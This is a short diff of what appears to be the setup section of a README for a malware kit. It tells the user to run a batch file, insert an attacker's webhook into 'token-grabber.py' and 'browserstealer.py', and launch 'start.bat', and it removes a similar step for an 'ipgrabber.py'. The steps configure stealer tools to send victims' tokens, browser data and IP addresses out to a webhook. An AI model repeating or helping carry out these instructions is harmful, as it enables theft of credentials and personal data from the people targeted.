@@ -15,6 +15,5 @@ Download as ZIP File
 run requirements.bat
 open token-grabber.py and replace 'WEBHOOK HERE' with your webhook (KEEP THE QUOTES)
 open browserstealer.py and replace 'WEBHOOK HERE' with your webhook (KEEP THE QUOTES)
-open ipgrabber.py and replace 'WEBHOOK HERE' with your webhook (KEEP THE QUOTES)
 run start.bat
 ```
